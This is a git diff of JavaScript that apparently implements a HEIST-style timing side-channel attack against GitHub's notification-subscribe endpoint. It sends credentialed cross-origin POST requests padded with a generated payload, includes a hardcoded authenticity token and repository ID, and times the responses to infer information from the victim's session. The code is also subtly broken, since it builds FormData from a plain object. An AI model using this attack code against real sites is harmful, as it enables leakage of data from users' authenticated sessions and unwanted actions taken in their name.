@@ -5,34 +5,6 @@ function start() {
   site = 'https://github.com/notifications/subscribe';
   fetchUrl(site, 4000);
 
-  // var T1, T2, T2minT1, interval;
-
-  //
-  // try {
-  //   fetch(site, {
-  //     mode: 'no-cors'
-  //   })
-  //   .then(function(result){
-  //     T1 = performance.now();
-  //     clearInterval(interval);
-  //   })
-  //   .catch(function(e){
-  //     console.log(e);
-  //   });
-  // } catch (e) {
-  //   if (e instanceof TypeError) {
-  //     console.log(e);
-  //   }
-  // }
-
-  // interval = setInterval(function(){
-  //   var entries = performance.getEntries();
-  //   var lastEntry = entries[entries.length-1];
-  //   if (lastEntry.name == site) {
-  //     T2minT1 = lastEntry.responseEnd - T1;
-  //     console.log(T2minT1);
-  //   }
-  // });
 }
 
 function fetchUrl(site, payloadSize) {
@@ -62,7 +34,13 @@ function fetchUrl(site, payloadSize) {
     redirect: 'manual',
     cache: 'no-cache',
     credentials: 'include',
-    body : generatePayload(8000)
+    body : new FormData({
+      utf8:'%E2%9C%93',
+      authenticity_token:'6nletYfGcKgnquE9UnR9IDGq13WZb7WgAQ8XoltMyXLrcoMUdYYfopfSKtTdKT87WHzu%2BrwUEThgqFbXCjBD8A%3D%3D',
+      repository_id:'64934908',
+      do:'included',
+      heist: generatePayload(8000)
+    })
   })
   .then(function(result){
     T1 = performance.now();
